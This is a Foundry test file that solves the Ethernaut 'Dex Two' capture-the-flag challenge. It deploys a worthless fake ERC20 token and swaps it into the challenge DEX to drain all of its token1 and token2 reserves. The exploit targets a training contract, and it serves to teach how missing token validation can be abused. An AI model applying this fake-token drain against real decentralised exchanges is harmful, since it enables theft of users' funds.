// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "../src/DexTwo/DexTwo.sol";
import "../src/DexTwo/DexTwoFactory.sol";
import "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

//ref https://stermi.medium.com/the-ethernaut-challenge-21-solution-dex-8d91bd0aed3

contract DexTwoTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testDexTwo() public {
        DexTwoFactory factory = new DexTwoFactory();
        address instance = factory.createInstance(_alice);
        DexTwo dex = DexTwo(payable(instance));
        vm.startPrank(_alice);
        address token1 = dex.token1();
        address token2 = dex.token2();
        console.log(dex.balanceOf(token1, address(dex)));
        SwappableTokenTwo fakeToken = new SwappableTokenTwo(
            address(dex),
            "Fake Token",
            "FT",
            10000
        );
        IERC20(token1).approve(address(dex), type(uint).max);
        IERC20(token2).approve(address(dex), type(uint).max);
        IERC20(fakeToken).approve(address(dex), type(uint).max);
        IERC20(fakeToken).transfer(address(dex), 1);
        dex.swap(address(fakeToken), token1, 1);
        assertEq(dex.balanceOf(token1, address(dex)), 0);
        dex.swap(address(fakeToken), token2, 2);
        vm.stopPrank();
        assertTrue(
            factory.validateInstance(payable(address(instance)), _alice),
            "invalid"
        );
    }
}
